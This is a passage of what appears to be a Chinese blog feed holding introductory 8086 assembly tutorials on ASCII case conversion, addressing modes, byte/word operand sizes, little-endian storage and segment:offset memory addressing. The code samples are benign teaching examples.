32d &#x3D; $2 ^ 5$，仅二进制形式的第 5 位不相同<br>例如：<code>&#39;a&#39; = 61h = 01100001b</code>，<code>&#39;A&#39; = 41h = 01000001b</code>，所以：<br>① <mark>将小写字母转换为大写，只需要将第 5 位的 1 置为 0，其他位不变<br>即：<code>and 11011111b（and DFh）</code></mark><br>② <mark>将大写字母转换为小写，只需要将第 5 位的 0 置为 1，其他位不变<br>即：<code>or 00100000b（or 20h）</code></mark></p></li></ol><p>示例，将 <code>&#39;BaSiC&#39;</code> 中的小写字母变为大写，将 <code>&#39;MinIX&#39;</code> 中的大写字母变为小写  </p><p>① 以 C 语言来描述：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">char a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> 'BaSiC'char b<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> 'MinIX'int main<span class="token punctuation">(</span><span class="token punctuation">)</span>&#123;int i <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">;</span>do&#123;a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xDF</span><span class="token comment">;   ; 将 'BaSiC' 中的小写字母变为大写</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token number">0x20</span><span class="token comment">;   ; 将 'MinIX' 中的大写字母变为小写</span>i<span class="token operator">+</span><span class="token operator">+</span><span class="token comment">;</span>&#125; while<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token comment">;</span>return <span class="token number">0</span><span class="token comment">;</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>② 以 [BX] 为例：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segment  <span class="token comment">; 数据段</span>db 'BaSiC'db 'MinIX'data endscode segment  <span class="token comment">; 代码段</span>start:mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> ax   <span class="token comment">; 将 ds 指向 data 段</span>mov bx<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; 设置 bx = 0，ds:bx 指向 'BaSiC' 的第一个字母</span>mov cx<span class="token punctuation">,</span> <span class="token number">5</span>   <span class="token comment">; 循环 5 次，因为 'BaSiC' 长度为 5</span>s:mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>   <span class="token comment">; 将 ds:bx 所指向的内存单元的数据（ASCII 码）送往 al</span>and al<span class="token punctuation">,</span> 11011111b   <span class="token comment">; 将小写字母变为大写</span>mov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> al   <span class="token comment">; 将转变后的 ASCII 码写回原单元</span>inc bx   <span class="token comment">; bx 加一，ds:bx 指向下一个字母</span>loop smov bx<span class="token punctuation">,</span> <span class="token number">5</span>   <span class="token comment">; 设置 bx = 5，ds:bx 指向 'MinIX' 的第一个字母</span>mov cx<span class="token punctuation">,</span> <span class="token number">5</span>   <span class="token comment">; 循环 5 次，因为 'MinIX' 长度为 5</span>s0:mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>   <span class="token comment">; 将 ds:bx 所指向的内存单元的数据（ASCII 码）送往 al</span>or al<span class="token punctuation">,</span> 00100000b   <span class="token comment">; 将大写字母变为小写</span>mov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> al   <span class="token comment">; 将转变后的 ASCII 码写回原单元</span>inc bx   <span class="token comment">; bx 加一，ds:bx 指向下一个字母</span>loop s0mov ax<span class="token punctuation">,</span> 4c00hint 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>③ 以 [BX + idata] 为例：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segment  <span class="token comment">; 数据段</span>db 'BaSiC'db 'MinIX'data endscode segment  <span class="token comment">; 代码段</span>start:mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> ax   <span class="token comment">; 将 ds 指向 data 段</span>mov bx<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; 设置 bx = 0，ds:bx 指向 'BaSiC' 的第一个字母</span>mov cx<span class="token punctuation">,</span> <span class="token number">5</span>   <span class="token comment">; 循环 5 次，因为 'BaSiC' 和 'MinIX' 长度都为 5，可以同时处理</span>s:mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>   <span class="token comment">; 将 ds:bx 所指向的内存单元的数据（ASCII 码）送往 al</span>and al<span class="token punctuation">,</span> 11011111b   <span class="token comment">; 将小写字母变为大写</span>mov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> al   <span class="token comment">; 将转变后的 ASCII 码写回原单元</span>mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">+</span> bx<span class="token punctuation">]</span>   <span class="token comment">; 将 ds:bx+5 所指向的内存单元的数据（ASCII 码）送往 al</span>or al<span class="token punctuation">,</span> 00100000b   <span class="token comment">; 将大写字母变为小写</span>mov <span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">+</span> bx<span class="token punctuation">]</span><span class="token punctuation">,</span> al   <span class="token comment">; 将转变后的 ASCII 码写回原单元</span>inc bx   <span class="token comment">; bx 加一，ds:bx 指向下一个字母</span>loop smov ax<span class="token punctuation">,</span> 4c00hint 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>④ 以 [BX + idata] 为例，还可以写为 idata[BX]：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segment  <span class="token comment">; 数据段</span>db 'BaSiC'db 'MinIX'data endscode segment  <span class="token comment">; 代码段</span>start:mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> ax   <span class="token comment">; 将 ds 指向 data 段</span>mov bx<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; 设置 bx = 0，ds:bx 指向 'BaSiC' 的第一个字母</span>mov cx<span class="token punctuation">,</span> <span class="token number">5</span>   <span class="token comment">; 循环 5 次，因为 'BaSiC' 和 'MinIX' 长度都为 5，可以同时处理</span>s:mov al<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">[</span>bx<span class="token punctuation">]</span>   <span class="token comment">; 将 ds:bx 所指向的内存单元的数据（ASCII 码）送往 al</span>and al<span class="token punctuation">,</span> 11011111b   <span class="token comment">; 将小写字母变为大写</span>mov <span class="token number">0</span><span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> al   <span class="token comment">; 将转变后的 ASCII 码写回原单元</span>mov al<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">[</span>bx<span class="token punctuation">]</span>   <span class="token comment">; 将 ds:bx+5 所指向的内存单元的数据（ASCII 码）送往 al</span>or al<span class="token punctuation">,</span> 00100000b   <span class="token comment">; 将大写字母变为小写</span>mov <span class="token number">5</span><span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> al   <span class="token comment">; 将转变后的 ASCII 码写回原单元</span>inc bx   <span class="token comment">; bx 加一，ds:bx 指向下一个字母</span>loop smov ax<span class="token punctuation">,</span> 4c00hint 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在 C 语言中，数组：a[i]，b[i]<br>在汇编语言中，数组：0[bx]，5[bx]<br><em>其中 0 和 5 给定了两个字符串的起始偏移地址，BX 给定了从起始偏移地址开始的相对地址</em></p></blockquote><hr><h1 id="数据位置的表达"><a href="#数据位置的表达" class="headerlink" title="数据位置的表达"></a>数据位置的表达</h1><blockquote><p>绝大部分机器指令都是进行数据处理的指令，可分为：读取、写入、运算三类<br><mark>在指令执行前，所要处理的数据可以在三个地方：CPU 内部、内存、端口</mark><br><mark>汇编语言中，用三个概念来表达数据的位置：立即数、寄存器、段地址和偏移地址（SA 和 EA）</mark></p><p>例如：<br><code>mov bx, [0]</code> 数据在内存中，ds:0 内存地址单元<br><code>mov bx, ax</code> 数据在 CPU 内部，AX 寄存器<br><code>mov bx, 1</code> 数据在 CPU 内部，指令缓冲器</p></blockquote><hr><h2 id="立即数"><a href="#立即数" class="headerlink" title="立即数"></a>立即数</h2><blockquote><p>立即数 idata 是直接包含在指令中的数据（指令执行前在 CPU 的指令缓冲器中），在汇编指令中直接给出</p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">1</span>add bx<span class="token punctuation">,</span> 2000hor bx<span class="token punctuation">,</span> 00010000bmov al<span class="token punctuation">,</span> <span class="token char">'a'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><blockquote><p>指令要处理的数据在寄存器中，在汇编指令中给出相应的寄存器名</p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> bxmov ds<span class="token punctuation">,</span> axpush bxmov ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bxpush dsmov ss<span class="token punctuation">,</span> axmov sp<span class="token punctuation">,</span> ax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="段地址和偏移地址"><a href="#段地址和偏移地址" class="headerlink" title="段地址和偏移地址"></a>段地址和偏移地址</h2><blockquote><p>指令要处理的数据在内存中，可用 [X] 的格式给出偏移地址 EA，段地址 SA 在某个段寄存器中</p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token comment">; 段寄存器默认在 DS</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>di<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> si<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> si <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token comment">; 段寄存器默认在 SS</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bp<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bp <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bp <span class="token operator">+</span> si<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bp <span class="token operator">+</span> si <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token comment">; 段寄存器显式给出</span>mov ax<span class="token punctuation">,</span> ds:<span class="token punctuation">[</span>bp<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> es:<span class="token punctuation">[</span>bx<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> ss:<span class="token punctuation">[</span>bx <span class="token operator">+</span> si<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> cs:<span class="token punctuation">[</span>bx <span class="token operator">+</span> si <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="数据的长度"><a href="#数据的长度" class="headerlink" title="数据的长度"></a>数据的长度</h1><blockquote><p>在 8086CPU 中，指令可以处理两种尺寸的数据：<code>byte</code> 和 <code>word</code><br>所以在机器指令中，需要指明是字操作还是字节操作</p></blockquote><hr><h2 id="用寄存器指明"><a href="#用寄存器指明" class="headerlink" title="用寄存器指明"></a>用寄存器指明</h2><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token comment">; 使用 16 位寄存器指明字操作</span>mov ax<span class="token punctuation">,</span> <span class="token number">1</span>mov bx<span class="token punctuation">,</span> ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>mov ds<span class="token punctuation">,</span> axmov ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> axinc axadd ax<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token comment">; 使用 8 位寄存器指明字节操作</span>mov al<span class="token punctuation">,</span> <span class="token number">1</span>mov al<span class="token punctuation">,</span> blmov al<span class="token punctuation">,</span> ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>mov ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> alinc aladd al<span class="token punctuation">,</span> <span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="用-X-ptr-指明"><a href="#用-X-ptr-指明" class="headerlink" title="用 X ptr 指明"></a>用 X ptr 指明</h2><blockquote><p><mark>在没有寄存器参与的内存单元访问指令中，使用 <code>word ptr</code> 和 <code>byte ptr</code> 显性指明所要访问的内存单元的长度是很有必要的</mark>，否则 CPU 无法得知所要访问的单元是字单元还是字节单元</p></blockquote><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token comment">; 用 word ptr 指明指令访问的内存单元是字单元</span>mov word ptr ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span>inc word ptr <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>inc word ptr ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>add word ptr <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token comment">; 用 byte ptr 指明指令访问的内存单元是字节单元</span>mov byte ptr ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span>inc byte ptr <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>inc byte ptr ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>add byte ptr <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token number">2000</span>:<span class="token number">1000</span>     FF  FF  FF  FF  FF  FF  FF  ······mov ax<span class="token punctuation">,</span> 2000hmov ds<span class="token punctuation">,</span> axmov byte ptr <span class="token punctuation">[</span>1000h<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token comment">; 执行后：</span><span class="token comment">; 2000:1000     01  FF  FF  FF  FF  FF  FF  ······</span>mov ax<span class="token punctuation">,</span> 2000hmov ds<span class="token punctuation">,</span> axmov word ptr <span class="token punctuation">[</span>1000h<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token comment">; 执行后：</span><span class="token comment">; 2000:1000     01  00  FF  FF  FF  FF  FF  ······</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="用指令指明"><a href="#用指令指明" class="headerlink" title="用指令指明"></a>用指令指明</h2><blockquote><p>有一些指令默认了访问的是字单元还是字节单元，例如：<code>push</code>、<code>pop</code> 等，因为 <code>push</code>、<code>pop</code> 只进行字操作</p></blockquote><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push <span class="token punctuation">[</span>1000h<span class="token punctuation">]</span>pop ax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 汇编语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> x86汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存与寄存器</title>
      <link href="/posts/310f0172.html"/>
      <url>/posts/310f0172.html</url>
      
        <content type="html"><![CDATA[<h1 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h1><blockquote><p>在内存中存储数据时，由于<strong>内存单元是字节单元，因此一个字要用 2 个地址连续的内存单元来存放</strong></p><p><em>字的低位字节存放在低地址单元中，字的高位字节存放在高地址单元中</em>（小端序）</p></blockquote><ul><li>例如，从 <code>0</code> 地址开始，先存放数据 <code>20000（4E20h）</code>，后存放数据 <code>18（0012h）</code>：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E5%86%85%E5%AD%98%E4%B8%AD%E5%AD%97%E7%9A%84%E5%AD%98%E5%82%A81.png" alt="x86汇编_内存中字的存储1.png"></p><hr><h1 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h1><blockquote><p>在 <code>mov</code> 指令中给出 8 位寄存器可以传输字节型（byte）数据，给出 16 位寄存器可以传输字型（word）数据</p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov bx<span class="token punctuation">,</span> 1000hmov ds<span class="token punctuation">,</span> bxmov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">; 将内存单元1000:0处的字型（word）数据送入ax</span>mov <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cx  <span class="token comment">; 将cx中的16位数据（word）送入内存单元1000:0处</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>例如，内存中的情况如右图，执行下列代码：<ol><li>首先将段地址寄存器 DS 设置为 1000h</li><li>将 <code>1000:0</code> 单元处存放的<code>字型数据（word）</code>赋值给 ax，<code>ax = 1123h</code></li><li>将 <code>1000:2</code> 单元处存放的<code>字型数据（word）</code>赋值给 bx，<code>bx = 6622h</code></li><li>将 <code>1000:1</code> 单元处存放的<code>字型数据（word）</code>赋值给 cx，<code>cx = 2211h</code></li><li>将 <code>1000:1</code> 单元处存放的<code>字型数据（word）</code>与 bx 相加，并将值存放在 bx，<code>bx = 8833h</code></li><li>将 <code>1000:2</code> 单元处存放的<code>字型数据（word）</code>与 cx 相加，并将值存放在 cx，<code>cx = 8833h</code></li></ol></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E5%AD%97%E7%9A%84%E4%BC%A0%E9%80%811.png" alt="x86汇编_字的传送1.png"></p><blockquote><p>要注意：从 内存 ——&gt; 寄存器 中的值是字节型数据（byte）还是字型数据（word），根据寄存器的位数来判断，例如：<em>al 为字节型，ax 为字型</em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 汇编语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> x86汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPU与寄存器</title>
      <link href="/posts/77142c05.html"/>
      <url>/posts/77142c05.html</url>
      
        <content type="html"><![CDATA[<h1 id="CPU-的结构"><a href="#CPU-的结构" class="headerlink" title="CPU 的结构"></a>CPU 的结构</h1><blockquote><p><mark>16 位结构（类似其他说法如：16 位机、字长为 16 位）的 CPU</mark> 指：</p><ol><li>运算器一次最多可以处理 16 位数据</li><li>寄存器的最大宽度为 16 位</li><li>寄存器和运算器之间的通路为 16 位</li></ol></blockquote><hr><h1 id="CPU-给出物理地址"><a href="#CPU-给出物理地址" class="headerlink" title="CPU 给出物理地址"></a>CPU 给出物理地址</h1><blockquote><p><mark>8086CPU 有 20 位地址总线，可以传送 20 位地址，寻址能力为：$2 ^ {20}$，即：1 MB</mark></p><p>但是 8086CPU 是 16 位结构，在内部一次性处理、传输、暂存的地址为 16 位，因此从内部结构来看，如果将地址从内部简单发出，就只能送出 16 位的地址，表现出的寻址能力只有：$2 ^ {16}$，即：64 KB</p><p>CPU 访问内存单元时，必须向内存提供内存单元的<strong>物理地址</strong></p></blockquote><ul><li><em>8086CPU 采用一种在内部用两个 16 位地址合成的方法来形成一个 20 位的物理地址</em></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_CPU%E7%BB%99%E5%87%BA%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%801.png" alt="x86汇编_CPU给出物理地址1.png"></p><ul><li><strong>地址加法器</strong>合成物理地址的方法：<code>物理地址 = 段地址 * 16 + 偏移地址</code> （<em>16 &#x3D; $2 ^ {4}$，表示左移 4 位</em>）</li></ul><p>以 8086CPU 访问地址为 <code>123C8h</code> 的内存单元为例：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_CPU%E7%BB%99%E5%87%BA%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%802.png" alt="x86汇编_CPU给出物理地址2.png"></p><p>不过，也可以将 <mark><code>段地址 * 16</code> 看作基地址</mark>，那么：<code>物理地址 = 基地址 + 偏移地址</code></p><blockquote><p>一个数据的二进制形式，左移 1 位，相当于乘 2<br>一个数据的二进制形式，左移 N 位，相当于乘 $2 ^ {N}$<br>一个数据的十六进制形式，左移 N 位，相当于乘 $16 ^ {N}$</p></blockquote><hr><h1 id="CPU-对内存分段"><a href="#CPU-对内存分段" class="headerlink" title="CPU 对内存分段"></a>CPU 对内存分段</h1><blockquote><p>其实，内存并没有分段，段的划分来自于 CPU，可以使用分段的方式来管理内存</p></blockquote><ul><li>分段的示例：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B51.png" alt="x86汇编_段1.png"></p><ul><li><p>在编程时可以根据需要，将若干个地址连续的内存单元看作一个段：</p><ol><li>用 <code>段地址 * 16</code> 来定位<em>段的起始地址（基地址）</em></li><li>用 <code>偏移地址</code> 来定位<em>段中的内存单元</em></li></ol></li><li><p>关于段需要<strong>注意</strong>的两点：</p><ol><li>由于 <code>段地址 * 16</code> 必然是 16 的倍数，所以一个段的起始地址也一定是 16 的倍数</li><li>由于 <code>偏移地址</code> 只有 16 位，而 16 位的寻址能力为 64 KB，所以一个段的最大长度只能是 64 KB</li></ol></li></ul><blockquote><p><em>一段内存，既可以是代码的存储空间，也可以是数据的存储空间，还可以是栈空间，甚至可以什么都不是，关键在于 CS、IP、SS、SP、DS 等寄存器的指向</em></p></blockquote><hr><h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><blockquote><p>可以将一段长度小于 64KB 的代码存放在地址连续、起始地址为 16 的倍数的内存单元中，称为代码段</p><p><strong>段地址放在 CS 中，将段中第一条指令的偏移地址放在 IP 中，CPU 就将执行我们定义的代码段中的指令</strong></p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">0000</span>          <span class="token punctuation">(</span>B8  <span class="token number">00</span>  <span class="token number">00</span><span class="token punctuation">)</span>add ax<span class="token punctuation">,</span> 0123h         <span class="token punctuation">(</span><span class="token number">05</span>  <span class="token number">23</span>  <span class="token number">01</span><span class="token punctuation">)</span>mov bx<span class="token punctuation">,</span> ax            <span class="token punctuation">(</span>8B  D8<span class="token punctuation">)</span>jmp bx                <span class="token punctuation">(</span>FF  E3<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>这段长度为 10 字节的指令，存放在 <code>123B0h ~ 123B9h</code> 的一组内存单元，就可以认为这是一个代码段，段地址为 <code>123Bh</code>，长度为 10 个字节</p></li><li><p>若要让这段代码执行，可设置 <code>CS = 123Bh</code>，<code>IP = 0000h</code></p></li></ol><hr><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><blockquote><p>可以将一段长度小于 64KB、地址连续、起始地址为 16 的倍数的内存单元专门存储数据，称为数据段</p><p><strong>段地址放在 DS 中，用 mov、add、sub 等访问内存单元时的指令时，CPU 就将我们定义的数据段中的内容作为数据来访问</strong></p></blockquote><ul><li><p>例如，将 <code>123B0h ~ 123B9h</code> 这段内存用于存放数据：</p><ol><li>段地址为 <code>123Bh</code>，长度为 10 个字节</li><li>若要访问数据段中的数据，可以在 DS 中存放数据段的段地址，再访问具体的单元</li></ol></li><li><p>比如，累加这个数据段中的前三个单元中的数据，代码如下：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 123Bhmov ds<span class="token punctuation">,</span> ax   <span class="token comment">; 将123Bh送入ds，作为数据段的段地址</span>mov al<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; 用al存放累加结果</span>add al<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">; 将数据段的第一个单元(偏移地址为0)中的数值加到al中</span>add al<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment">; 将数据段的第二个单元(偏移地址为1)中的数值加到al中</span>add al<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>   <span class="token comment">; 将数据段的第三个单元(偏移地址为2)中的数值加到al中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>再比如，累加这个数据段中的前三个<strong>字型</strong>数据，代码如下：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 123Bhmov ds<span class="token punctuation">,</span> ax   <span class="token comment">; 将123Bh送入ds，作为数据段的段地址</span>mov ax<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; 用ax存放累加结果</span>add ax<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">; 将数据段的第一个字(偏移地址为0)加到ax中</span>add ax<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>   <span class="token comment">; 将数据段的第二个字(偏移地址为2)加到ax中</span>add ax<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token comment">; 将数据段的第三个字(偏移地址为4)加到ax中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h2><blockquote><p>可以将一段长度小于 64KB、地址连续、起始地址为 16 的倍数的内存单元当作栈空间来使用，称为栈段</p><p><strong>段地址放在 SS 中，将栈顶单元的偏移地址放在 SP 中，用 push、pop 指令时，CPU 就将我们定义的栈段当作栈空间使用</strong></p></blockquote><ul><li>例如，将 <code>10010h ~ 1001Fh</code> 这段长度为 16 字节的内存空间当作栈来使用<ol><li>段地址为 <code>1001h</code>，大小为 16 字节</li><li>以栈的方式来进行访问，这段空间就可以称为一个栈段</li></ol></li></ul><hr><h1 id="CPU-的寄存器"><a href="#CPU-的寄存器" class="headerlink" title="CPU 的寄存器"></a>CPU 的寄存器</h1><blockquote><p>一个典型的 CPU 由<strong>运算器</strong>、<strong>控制器</strong>、<strong>寄存器</strong>等组成</p><p>8086CPU 的所有寄存器都是 16位 的，可以存放两个字节</p></blockquote><ul><li>寄存器分类：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E5%AF%84%E5%AD%98%E5%99%A81.png" 